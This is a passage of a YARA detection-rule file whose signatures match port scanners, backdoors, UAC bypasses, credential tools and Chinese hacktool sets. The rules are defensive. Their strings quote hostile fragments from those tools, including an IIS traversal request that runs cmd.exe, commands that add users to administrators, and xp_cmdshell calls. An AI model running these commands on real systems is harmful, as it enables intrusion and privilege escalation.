		all of ($s*)
}

rule IP_Stealing_Utilities {
	meta:
		description = "Auto-generated rule on file IP Stealing Utilities.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "65646e10fb15a2940a37c5ab9f59c7fc"
	strings:
		$s0 = "DarkKnight"
		$s9 = "IPStealerUtilities"
	condition:
		all of them
}

rule SuperScan4 {
	meta:
		description = "Auto-generated rule on file SuperScan4.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "78f76428ede30e555044b83c47bc86f0"
	strings:
		$s2 = " td class=\"summO1\">"
		$s6 = "REM'EBAqRISE"
		$s7 = "CorExitProcess'msc#e"
	condition:
		all of them

}
rule PortRacer {
	meta:
		description = "Auto-generated rule on file PortRacer.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "2834a872a0a8da5b1be5db65dfdef388"
	strings:
		$s0 = "Auto Scroll BOTH Text Boxes"
		$s4 = "Start/Stop Portscanning"
		$s6 = "Auto Save LogFile by pressing STOP"
	condition:
		all of them
}

rule scanarator {
	meta:
		description = "Auto-generated rule on file scanarator.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "848bd5a518e0b6c05bd29aceb8536c46"
	strings:
		$s4 = "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"
	condition:
		all of them
}

rule aolipsniffer {
	meta:
		description = "Auto-generated rule on file aolipsniffer.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "51565754ea43d2d57b712d9f0a3e62b8"
	strings:
		$s0 = "C:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB"
		$s1 = "dwGetAddressForObject"
		$s2 = "Color Transfer Settings"
		$s3 = "FX Global Lighting Angle"
		$s4 = "Version compatibility info"
		$s5 = "New Windows Thumbnail"
		$s6 = "Layer ID Generator Base"
		$s7 = "Color Halftone Settings"
		$s8 = "C:\\WINDOWS\\SYSTEM\\MSWINSCK.oca"
	condition:
		all of them
}

rule _Bitchin_Threads_ {
	meta:
		description = "Auto-generated rule on file =Bitchin Threads=.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "7491b138c1ee5a0d9d141fbfd1f0071b"
	strings:
		$s0 = "DarKPaiN"
		$s1 = "=BITCHIN THREADS"
	condition:
		all of them
}

rule cgis4_cgis4 {
	meta:
		description = "Auto-generated rule on file cgis4.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "d658dad1cd759d7f7d67da010e47ca23"
	strings:
		$s0 = ")PuMB_syJ"
		$s1 = "&,fARW>yR"
		$s2 = "m3hm3t_rullaz"
		$s3 = "7Projectc1"
		$s4 = "Ten-GGl\""
		$s5 = "/Moziqlxa"
	condition:
		all of them
}

rule portscan {
	meta:
		description = "Auto-generated rule on file portscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "a8bfdb2a925e89a281956b1e3bb32348"
	strings:
		$s5 = "0    :SCAN BEGUN ON PORT:"
		$s6 = "0    :PORTSCAN READY."
	condition:
		all of them
}

rule ProPort_zip_Folder_ProPort {
	meta:
		description = "Auto-generated rule on file ProPort.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "c1937a86939d4d12d10fc44b7ab9ab27"
	strings:
		$s0 = "Corrupt Data!"
		$s1 = "K4p~omkIz"
		$s2 = "DllTrojanScan"
		$s3 = "GetDllInfo"
		$s4 = "Compressed by Petite (c)1999 Ian Luck."
		$s5 = "GetFileCRC32"
		$s6 = "GetTrojanNumber"
		$s7 = "TFAKAbout"
	condition:
		all of them
}

rule StealthWasp_s_Basic_PortScanner_v1_2 {
	meta:
		description = "Auto-generated rule on file StealthWasp's Basic PortScanner v1.2.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "7c0f2cab134534cd35964fe4c6a1ff00"
	strings:
		$s1 = "Basic PortScanner"
		$s6 = "Now scanning port:"
	condition:
		all of them
}

rule BluesPortScan {
	meta:
		description = "Auto-generated rule on file BluesPortScan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "6292f5fc737511f91af5e35643fc9eef"
	strings:
		$s0 = "This program was made by Volker Voss"
		$s1 = "JiBOo~SSB"
	condition:
		all of them
}

rule scanarator_iis {
	meta:
		description = "Auto-generated rule on file iis.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "3a8fc02c62c8dd65e038cc03e5451b6e"
	strings:
		$s0 = "example: iis 10.10.10.10"
		$s1 = "send error"
	condition:
		all of them
}

rule stealth_Stealth {
	meta:
		description = "Auto-generated rule on file Stealth.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "8ce3a386ce0eae10fc2ce0177bbc8ffa"
	strings:
		$s3 = "<table width=\"60%\" bgcolor=\"black\" cellspacing=\"0\" cellpadding=\"2\" border=\"1\" bordercolor=\"white\"><tr><td>"
		$s6 = "This tool may be used only by system administrators. I am not responsible for "
	condition:
		all of them
}

rule Angry_IP_Scanner_v2_08_ipscan {
	meta:
		description = "Auto-generated rule on file ipscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "70cf2c09776a29c3e837cb79d291514a"
	strings:
		$s0 = "_H/EnumDisplay/"
		$s5 = "ECTED.MSVCRT0x"
		$s8 = "NotSupported7"
	condition:
		all of them
}

rule crack_Loader {
	meta:
		description = "Auto-generated rule on file Loader.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "f4f79358a6c600c1f0ba1f7e4879a16d"
	strings:
		$s0 = "NeoWait.exe"
		$s1 = "RRRRRRRW"
	condition:
		all of them
}

rule CN_GUI_Scanner {
	meta:
		description = "Detects an unknown GUI scanner tool - CN background"
		author = "Florian Roth"
		hash = "3c67bbb1911cdaef5e675c56145e1112"
		score = 65
		date = "04.10.2014"
	strings:
		$s1 = "good.txt" fullword ascii
		$s2 = "IP.txt" fullword ascii
		$s3 = "xiaoyuer" fullword ascii
		$s0w = "ssh(" fullword wide
		$s1w = ").exe" fullword wide
	condition:
		all of them
}

rule CN_Packed_Scanner {
	meta:
		description = "Suspiciously packed executable"
		author = "Florian Roth"
		hash = "6323b51c116a77e3fba98f7bb7ff4ac6"
		score = 40
		date = "06.10.2014"
	strings:
		$s1 = "kernel32.dll" fullword ascii
		$s2 = "CRTDLL.DLL" fullword ascii
		$s3 = "__GetMainArgs" fullword ascii
		$s4 = "WS2_32.DLL" fullword ascii
	condition:
		all of them and filesize < 180KB and filesize > 70KB
}

rule Tiny_Network_Tool_Generic {
	meta:
		description = "Tiny tool with suspicious function imports. (Rule based on WinEggDrop Scanner samples)"
		author = "Florian Roth"
		date = "08.10.2014"
		score = 40
		type = "file"
		hash0 = "9e1ab25a937f39ed8b031cd8cfbc4c07"
		hash1 = "cafc31d39c1e4721af3ba519759884b9"
		hash2 = "8e635b9a1e5aa5ef84bfa619bd2a1f92"
	strings:
		$magic	= { 4d 5a }

		$s0 = "KERNEL32.DLL" fullword ascii
		$s1 = "CRTDLL.DLL" fullword ascii
		$s3 = "LoadLibraryA" fullword ascii
		$s4 = "GetProcAddress" fullword ascii

		$y1 = "WININET.DLL" fullword ascii
		$y2 = "atoi" fullword ascii

		$x1 = "ADVAPI32.DLL" fullword ascii
		$x2 = "USER32.DLL" fullword ascii
		$x3 = "wsock32.dll" fullword ascii
		$x4 = "FreeSid" fullword ascii
		$x5 = "atoi" fullword ascii

		$z1 = "ADVAPI32.DLL" fullword ascii
		$z2 = "USER32.DLL" fullword ascii
		$z3 = "FreeSid" fullword ascii
		$z4 = "ToAscii" fullword ascii

	condition:
		( $magic at 0 ) and all of ($s*) and ( all of ($y*) or all of ($x*) or all of ($z*) ) and filesize < 15KB
}

rule Beastdoor_Backdoor {
	meta:
		description = "Detects the backdoor Beastdoor"
		author = "Florian Roth"
		score = 55
		hash = "5ab10dda548cb821d7c15ebcd0a9f1ec6ef1a14abcc8ad4056944d060c49535a"
	strings:
		$s0 = "Redirect SPort RemoteHost RPort  -->Port Redirector" fullword
		$s1 = "POST /scripts/WWPMsg.dll HTTP/1.0" fullword
		$s2 = "http://IP/a.exe a.exe            -->Download A File" fullword
		$s7 = "Host: wwp.mirabilis.com:80" fullword
		$s8 = "%s -Set Port PortNumber              -->Set The Service Port" fullword
		$s11 = "Shell                            -->Get A Shell" fullword
		$s14 = "DeleteService ServiceName        -->Delete A Service" fullword
		$s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword
		$s17 = "%s -Set ServiceName ServiceName      -->Set The Service Name" fullword
	condition:
		2 of them
}

rule Powershell_Netcat {
	meta:
		description = "Detects a Powershell version of the Netcat network hacking tool"
		author = "Florian Roth"
		score = 60
		date = "10.10.2014"
	strings:
		$s0 = "[ValidateRange(1, 65535)]" fullword
		$s1 = "$Client = New-Object -TypeName System.Net.Sockets.TcpClient" fullword
		$s2 = "$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize" fullword
	condition:
		all of them
}

rule Chinese_Hacktool_1014 {
	meta:
		description = "Detects a chinese hacktool with unknown use"
		author = "Florian Roth"
		score = 60
		date = "10.10.2014"
		hash = "98c07a62f7f0842bcdbf941170f34990"
	strings:
		$s0 = "IEXT2_IDC_HORZLINEMOVECURSOR" fullword wide
		$s1 = "msctls_progress32" fullword wide
		$s2 = "Reply-To: %s" fullword ascii
		$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii
		$s4 = "html htm htx asp" fullword ascii
	condition:
		all of them
}

rule CN_Hacktool_BAT_PortsOpen {
	meta:
		description = "Detects a chinese BAT hacktool for local port evaluation"
		author = "Florian Roth"
		score = 60
		date = "12.10.2014"
	strings:
		$s0 = "for /f \"skip=4 tokens=2,5\" %%a in ('netstat -ano -p TCP') do (" ascii
		$s1 = "in ('tasklist /fi \"PID eq %%b\" /FO CSV') do " ascii
		$s2 = "@echo off" ascii
	condition:
		all of them
}

rule CN_Hacktool_SSPort_Portscanner {
	meta:
		description = "Detects a chinese Portscanner named SSPort"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "Golden Fox" fullword wide
		$s1 = "Syn Scan Port" fullword wide
		$s2 = "CZ88.NET" fullword wide
	condition:
		all of them
}

rule CN_Hacktool_ScanPort_Portscanner {
	meta:
		description = "Detects a chinese Portscanner named ScanPort"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "LScanPort" fullword wide
		$s1 = "LScanPort Microsoft" fullword wide
		$s2 = "www.yupsoft.com" fullword wide
	condition:
		all of them
}

rule CN_Hacktool_S_EXE_Portscanner {
	meta:
		description = "Detects a chinese Portscanner named s.exe"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "\\Result.txt" fullword ascii
		$s1 = "By:ZT QQ:376789051" fullword ascii
		$s2 = "(http://www.eyuyan.com)" fullword wide
	condition:
		all of them
}

rule CN_Hacktool_MilkT_BAT {
	meta:
		description = "Detects a chinese Portscanner named MilkT - shipped BAT"
		author = "Florian Roth"
		score = 70
		date = "12.10.2014"
	strings:
		$s0 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" ascii
		$s1 = "if not \"%Choice%\"==\"\" set Choice=%Choice:~0,1%" ascii
	condition:
		all of them
}

rule CN_Hacktool_MilkT_Scanner {
	meta:
		description = "Detects a chinese Portscanner named MilkT"
		author = "Florian Roth"
		score = 60
		date = "12.10.2014"
	strings:
		$s0 = "Bf **************" ascii fullword
		$s1 = "forming Time: %d/" ascii
		$s2 = "KERNEL32.DLL" ascii fullword
		$s3 = "CRTDLL.DLL" ascii fullword
		$s4 = "WS2_32.DLL" ascii fullword
		$s5 = "GetProcAddress" ascii fullword
		$s6 = "atoi" ascii fullword
	condition:
		all of them
}

rule CN_Hacktool_1433_Scanner {
	meta:
		description = "Detects a chinese MSSQL scanner"
		author = "Florian Roth"
		score = 40
		date = "12.10.2014"
	strings:
		$magic = { 4d 5a }
		$s0 = "1433" wide fullword
		$s1 = "1433V" wide
		$s2 = "del Weak1.txt" ascii fullword
		$s3 = "del Attack.txt" ascii fullword
		$s4 = "del /s /Q C:\\Windows\\system32\\doors\\" fullword ascii
		$s5 = "!&start iexplore http://www.crsky.com/soft/4818.html)" fullword ascii
	condition:
		( $magic at 0 ) and all of ($s*)
}

rule CN_Hacktool_1433_Scanner_Comp2 {
	meta:
		description = "Detects a chinese MSSQL scanner - component 2"
		author = "Florian Roth"
		score = 40
		date = "12.10.2014"
	strings:
		$magic = { 4d 5a }
		$s0 = "1433" wide fullword
		$s1 = "1433V" wide
		$s2 = "UUUMUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUMUUU" ascii fullword
	condition:
		( $magic at 0 ) and all of ($s*)
}

rule WCE_Modified_1_1014 {
	meta:
		description = "Modified (packed) version of Windows Credential Editor"
		author = "Florian Roth"
		hash = "09a412ac3c85cedce2642a19e99d8f903a2e0354"
		score = 70
	strings:
		$s0 = "LSASS.EXE" fullword ascii
		$s1 = "_CREDS" ascii
		$s9 = "Using WCE " ascii
	condition:
		all of them
}

rule ReactOS_cmd_valid {
	meta:
		description = "ReactOS cmd.exe with correct file name - maybe packed with software or part of hacker toolset"
		author = "Florian Roth"
		date = "05.11.14"
		reference = "http://www.elifulkerson.com/articles/suzy-sells-cmd-shells.php"
		score = 30
		hash = "b88f050fa69d85af3ff99af90a157435296cbb6e"
	strings:
		$s1 = "ReactOS Command Processor" fullword wide
		$s2 = "Copyright (C) 1994-1998 Tim Norman and others" fullword wide
		$s3 = "Eric Kohl and others" fullword wide
		$s4 = "ReactOS Operating System" fullword wide
	condition:
		all of ($s*)
}

rule iKAT_wmi_rundll {
	meta:
		description = "This exe will attempt to use WMI to Call the Win32_Process event to spawn rundll - file wmi_rundll.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 65
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "97c4d4e6a644eed5aa12437805e39213e494d120"
	strings:
		$s0 = "This operating system is not supported." fullword ascii
		$s1 = "Error!" fullword ascii
		$s2 = "Win32 only!" fullword ascii
		$s3 = "COMCTL32.dll" fullword ascii
		$s4 = "[LordPE]" ascii
		$s5 = "CRTDLL.dll" fullword ascii
		$s6 = "VBScript" fullword ascii
		$s7 = "CoUninitialize" fullword ascii
	condition:
		all of them and filesize < 15KB
}

rule iKAT_revelations {
	meta:
		description = "iKAT hack tool showing the content of password fields - file revelations.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 75
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "c4e217a8f2a2433297961561c5926cbd522f7996"
	strings:
		$s0 = "The RevelationHelper.DLL file is corrupt or missing." fullword ascii
		$s8 = "BETAsupport@snadboy.com" fullword wide
		$s9 = "support@snadboy.com" fullword wide
		$s14 = "RevelationHelper.dll" fullword ascii
	condition:
		all of them
}

rule iKAT_priv_esc_tasksch {
	meta:
		description = "Task Schedulder Local Exploit - Windows local priv-esc using Task Scheduler, published by webDevil. Supports Windows 7 and Vista."
		author = "Florian Roth"
		date = "05.11.14"
		score = 75
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "84ab94bff7abf10ffe4446ff280f071f9702cf8b"
	strings:
		$s0 = "objShell.Run \"schtasks /change /TN wDw00t /disable\",,True" fullword ascii
		$s3 = "objShell.Run \"schtasks /run /TN wDw00t\",,True" fullword ascii
		$s4 = "'objShell.Run \"cmd /c copy C:\\windows\\system32\\tasks\\wDw00t .\",,True" fullword ascii
		$s6 = "a.WriteLine (\"schtasks /delete /f /TN wDw00t\")" fullword ascii
		$s7 = "a.WriteLine (\"net user /add ikat ikat\")" fullword ascii
		$s8 = "a.WriteLine (\"cmd.exe\")" fullword ascii
		$s9 = "strFileName=\"C:\\windows\\system32\\tasks\\wDw00t\"" fullword ascii
		$s10 = "For n = 1 To (Len (hexXML) - 1) step 2" fullword ascii
		$s13 = "output.writeline \" Should work on Vista/Win7/2008 x86/x64\"" fullword ascii
		$s11 = "Set objExecObject = objShell.Exec(\"cmd /c schtasks /query /XML /TN wDw00t\")" fullword ascii
		$s12 = "objShell.Run \"schtasks /create /TN wDw00t /sc monthly /tr \"\"\"+biatchFile+\"" ascii
		$s14 = "a.WriteLine (\"net localgroup administrators /add v4l\")" fullword ascii
		$s20 = "Set ts = fso.createtextfile (\"wDw00t.xml\")" fullword ascii
	condition:
		2 of them
}

rule iKAT_command_lines_agent {
	meta:
		description = "iKAT hack tools set agent - file ikat.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 75
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "c802ee1e49c0eae2a3fc22d2e82589d857f96d94"
	strings:
		$s0 = "Extended Module: super mario brothers" fullword ascii
		$s1 = "Extended Module: " fullword ascii
		$s3 = "ofpurenostalgicfeeling" fullword ascii
		$s8 = "-supermariobrotheretic" fullword ascii
		$s9 = "!http://132.147.96.202:80" fullword ascii
		$s12 = "iKAT Exe Template" fullword ascii
		$s15 = "withadancyflavour.." fullword ascii
		$s16 = "FastTracker v2.00   " fullword ascii
	condition:
		4 of them
}

rule iKAT_cmd_as_dll {
	meta:
		description = "iKAT toolset file cmd.dll ReactOS file cloaked"
		author = "Florian Roth"
		date = "05.11.14"
		score = 65
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "b5d0ba941efbc3b5c97fe70f70c14b2050b8336a"
	strings:
		$s1 = "cmd.exe" fullword wide
		$s2 = "ReactOS Development Team" fullword wide
		$s3 = "ReactOS Command Processor" fullword wide

		$ext = "extension: .dll" nocase
	condition:
		all of ($s*) and $ext
}

rule iKAT_tools_nmap {
	meta:
		description = "Generic rule for NMAP - based on NMAP 4 standalone"
		author = "Florian Roth"
		date = "05.11.14"
		score = 50
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "d0543f365df61e6ebb5e345943577cc40fca8682"
	strings:
		$s0 = "Insecure.Org" fullword wide
		$s1 = "Copyright (c) Insecure.Com" fullword wide
		$s2 = "nmap" fullword nocase
		$s3 = "Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm)." ascii
	condition:
		all of them
}

rule iKAT_startbar {
	meta:
		description = "Tool to hide unhide the windows startbar from command line - iKAT hack tools - file startbar.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 50
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		hash = "0cac59b80b5427a8780168e1b85c540efffaf74f"
	strings:
		$s2 = "Shinysoft Limited1" fullword ascii
		$s3 = "Shinysoft Limited0" fullword ascii
		$s4 = "Wellington1" fullword ascii
		$s6 = "Wainuiomata1" fullword ascii
		$s8 = "56 Wright St1" fullword ascii
		$s9 = "UTN-USERFirst-Object" fullword ascii
		$s10 = "New Zealand1" fullword ascii
	condition:
		all of them
}

rule iKAT_gpdisable_customcmd_kitrap0d_uacpoc {
	meta:
		description = "iKAT hack tool set generic rule - from files gpdisable.exe, customcmd.exe, kitrap0d.exe, uacpoc.exe"
		author = "Florian Roth"
		date = "05.11.14"
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		super_rule = 1
		hash0 = "814c126f21bc5e993499f0c4e15b280bf7c1c77f"
		hash1 = "2725690954c2ad61f5443eb9eec5bd16ab320014"
		hash2 = "75f5aed1e719443a710b70f2004f34b2fe30f2a9"
		hash3 = "b65a460d015fd94830d55e8eeaf6222321e12349"
		score = 20
	strings:
		$s0 = "Failed to get temp file for source AES decryption" fullword
		$s5 = "Failed to get encryption header for pwd-protect" fullword
		$s17 = "Failed to get filetime" fullword
		$s20 = "Failed to delete temp file for password decoding (3)" fullword
	condition:
		all of them
}

rule iKAT_Tool_Generic {
	meta:
		description = "Generic Rule for hack tool iKAT files gpdisable.exe, kitrap0d.exe, uacpoc.exe"
		author = "Florian Roth"
		date = "05.11.14"
		score = 55
		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
		super_rule = 1
		hash0 = "814c126f21bc5e993499f0c4e15b280bf7c1c77f"
		hash1 = "75f5aed1e719443a710b70f2004f34b2fe30f2a9"
		hash2 = "b65a460d015fd94830d55e8eeaf6222321e12349"
	strings:
		$s0 = "<IconFile>C:\\WINDOWS\\App.ico</IconFile>" fullword
		$s1 = "Failed to read the entire file" fullword
		$s4 = "<VersionCreatedBy>14.4.0</VersionCreatedBy>" fullword
		$s8 = "<ProgressCaption>Run &quot;executor.bat&quot; once the shell has spawned.</P"
		$s9 = "Running Zip pipeline..." fullword
		$s10 = "<FinTitle />" fullword
		$s12 = "<AutoTemp>0</AutoTemp>" fullword
		$s14 = "<DefaultDir>%TEMP%</DefaultDir>" fullword
		$s15 = "AES Encrypting..." fullword
		$s20 = "<UnzipDir>%TEMP%</UnzipDir>" fullword
	condition:
		all of them
}

rule BypassUac2 {
	meta:
		description = "Auto-generated rule - file BypassUac2.zip"
		author = "yarGen Yara Rule Generator"
		hash = "ef3e7dd2d1384ecec1a37254303959a43695df61"
	strings:
		$s0 = "/BypassUac/BypassUac/BypassUac_Utils.cpp" fullword ascii
		$s1 = "/BypassUac/BypassUacDll/BypassUacDll.aps" fullword ascii
		$s3 = "/BypassUac/BypassUac/BypassUac.ico" fullword ascii
	condition:
		all of them
}

rule BypassUac_3 {
	meta:
		description = "Auto-generated rule - file BypassUacDll.dll"
		author = "yarGen Yara Rule Generator"
		hash = "1974aacd0ed987119999735cad8413031115ce35"
	strings:
		$s0 = "BypassUacDLL.dll" fullword wide
		$s1 = "\\Release\\BypassUacDll" ascii
		$s3 = "Win7ElevateDLL" fullword wide
		$s7 = "BypassUacDLL" fullword wide
	condition:
		3 of them
}

rule BypassUac_9 {
	meta:
		description = "Auto-generated rule - file BypassUac.zip"
		author = "yarGen Yara Rule Generator"
		hash = "93c2375b2e4f75fc780553600fbdfd3cb344e69d"
	strings:
		$s0 = "/x86/BypassUac.exe" fullword ascii
		$s1 = "/x64/BypassUac.exe" fullword ascii
		$s2 = "/x86/BypassUacDll.dll" fullword ascii
		$s3 = "/x64/BypassUacDll.dll" fullword ascii
		$s15 = "BypassUac" fullword ascii
	condition:
		all of them
}

rule BypassUacDll_6 {
	meta:
		description = "Auto-generated rule - file BypassUacDll.aps"
		author = "yarGen Yara Rule Generator"
		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
	strings:
		$s3 = "BypassUacDLL.dll" fullword wide
		$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii
	condition:
		all of them
}

rule BypassUacDll_7 {
	meta:
		description = "Auto-generated rule - file BypassUacDll.aps"
		author = "yarGen Yara Rule Generator"
		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
	strings:
		$s3 = "BypassUacDLL.dll" fullword wide
		$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii
	condition:
		all of them
}

rule BypassUac_EXE {
	meta:
		description = "Auto-generated rule - file BypassUacDll.aps"
		author = "yarGen Yara Rule Generator"
		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
	strings:
		$s1 = "Wole32.dll" wide
		$s3 = "System32\\migwiz" wide
		$s4 = "System32\\migwiz\\CRYPTBASE.dll" wide
		$s5 = "Elevation:Administrator!new:" wide
		$s6 = "BypassUac" wide
	condition:
		all of them
}

rule APT_Proxy_Malware_Packed_dev
{
	meta:
		author = "FRoth"
		date = "2014-11-10"
		description = "APT Malware - Proxy"
		hash = "6b6a86ceeab64a6cb273debfa82aec58"
		score = 50
	strings:
		$string0 = "PECompact2" fullword
		$string1 = "[LordPE]"
		$string2 = "steam_ker.dll"
	condition:
		all of them
}

rule Tzddos_DDoS_Tool_CN {
	meta:
		description = "Disclosed hacktool set - file tzddos"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "d4c517eda5458247edae59309453e0ae7d812f8e"
	strings:
		$s0 = "for /f %%a in (host.txt) do (" fullword ascii
		$s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
		$s2 = "del host.txt /q" fullword ascii
		$s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
		$s4 = "start Http.exe %%a %http%" fullword ascii
		$s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
		$s6 = "del Result.txt s2.txt s1.txt " fullword ascii
	condition:
		all of them
}

rule Ncat_Hacktools_CN {
	meta:
		description = "Disclosed hacktool set - file nc.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "001c0c01c96fa56216159f83f6f298755366e528"
	strings:
		$s0 = "nc -l -p port [options] [hostname] [port]" fullword ascii
		$s2 = "nc [-options] hostname port[s] [ports] ... " fullword ascii
		$s3 = "gethostpoop fuxored" fullword ascii
		$s6 = "VERNOTSUPPORTED" fullword ascii
		$s7 = "%s [%s] %d (%s)" fullword ascii
		$s12 = " `--%s' doesn't allow an argument" fullword ascii
	condition:
		all of them
}

rule MS08_067_Exploit_Hacktools_CN {
	meta:
		description = "Disclosed hacktool set - file cs.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "a3e9e0655447494253a1a60dbc763d9661181322"
	strings:
		$s0 = "MS08-067 Exploit for CN by EMM@ph4nt0m.org" fullword ascii
		$s3 = "Make SMB Connection error:%d" fullword ascii
		$s5 = "Send Payload Over!" fullword ascii
		$s7 = "Maybe Patched!" fullword ascii
		$s8 = "RpcExceptionCode() = %u" fullword ascii
		$s11 = "ph4nt0m" fullword wide
		$s12 = "\\\\%s\\IPC" ascii
	condition:
		4 of them
}

rule Hacktools_CN_Burst_sql {
	meta:
		description = "Disclosed hacktool set - file sql.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "d5139b865e99b7a276af7ae11b14096adb928245"
	strings:
		$s0 = "s.exe %s %s %s %s %d /save" fullword ascii
		$s2 = "s.exe start error...%d" fullword ascii
		$s4 = "EXEC sp_addextendedproc xp_cmdshell,'xplog70.dll'" fullword ascii
		$s7 = "EXEC master..xp_cmdshell 'wscript.exe cc.js'" fullword ascii
		$s10 = "Result.txt" fullword ascii
		$s11 = "Usage:sql.exe [options]" fullword ascii
		$s17 = "%s root %s %d error" fullword ascii
		$s18 = "Pass.txt" fullword ascii
		$s20 = "SELECT sillyr_at_gmail_dot_com INTO DUMPFILE '%s\\\\sillyr_x.so' FROM sillyr_x" fullword ascii
	condition:
		6 of them
}

rule Hacktools_CN_Panda_445TOOL {
	meta:
		description = "Disclosed hacktool set - file 445TOOL.rar"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "92050ba43029f914696289598cf3b18e34457a11"
	strings:
		$s0 = "scan.bat" fullword ascii
		$s1 = "Http.exe" fullword ascii
		$s2 = "GOGOGO.bat" fullword ascii
		$s3 = "ip.txt" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_Panda_445 {
	meta:
		description = "Disclosed hacktool set - file 445.rar"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "a61316578bcbde66f39d88e7fc113c134b5b966b"
	strings:
		$s0 = "for /f %%i in (ips.txt) do (start cmd.bat %%i)" fullword ascii
		$s1 = "445\\nc.exe" fullword ascii
		$s2 = "445\\s.exe" fullword ascii
		$s3 = "cs.exe %1" fullword ascii
		$s4 = "445\\cs.exe" fullword ascii
		$s5 = "445\\ip.txt" fullword ascii
		$s6 = "445\\cmd.bat" fullword ascii
		$s9 = "@echo off" fullword ascii
	condition:
		all of them
}

rule Hacktools_CN_WinEggDrop {
	meta:
		description = "Disclosed hacktool set - file s.exe"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "7665011742ce01f57e8dc0a85d35ec556035145d"
	strings:
		$s0 = "Normal Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
		$s2 = "SYN Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
		$s6 = "Example: %s TCP 12.12.12.12 12.12.12.254 21 512 /Banner" fullword ascii
		$s8 = "Something Wrong About The Ports" fullword ascii
		$s9 = "Performing Time: %d/%d/%d %d:%d:%d --> " fullword ascii
		$s10 = "Example: %s TCP 12.12.12.12/24 80 512 /T8 /Save" fullword ascii
		$s12 = "%u Ports Scanned.Taking %d Threads " fullword ascii
		$s13 = "%-16s %-5d -> \"%s\"" fullword ascii
		$s14 = "SYN Scan Can Only Perform On WIN 2K Or Above" fullword ascii
		$s17 = "SYN Scan: About To Scan %s:%d Using %d Thread" fullword ascii
		$s18 = "Scan %s Complete In %d Hours %d Minutes %d Seconds. Found %u Open Ports" fullword ascii
	condition:
		5 of them
}

rule Hacktools_CN_Scan_BAT {
	meta:
		description = "Disclosed hacktool set - file scan.bat"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
		hash = "6517d7c245f1300e42f7354b0fe5d9666e5ce52a"
	strings:
		$s0 = "for /f %%a in (host.txt) do (" fullword ascii
		$s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
		$s2 = "del host.txt /q" fullword ascii
		$s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
		$s4 = "start Http.exe %%a %http%" fullword ascii
		$s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
	condition:
		5 of them
}

rule Hacktools_CN_Panda_Burst {
	meta:
		description = "Disclosed hacktool set - file Burst.rar"
		author = "Florian Roth"
		date = "17.11.14"
		score = 60
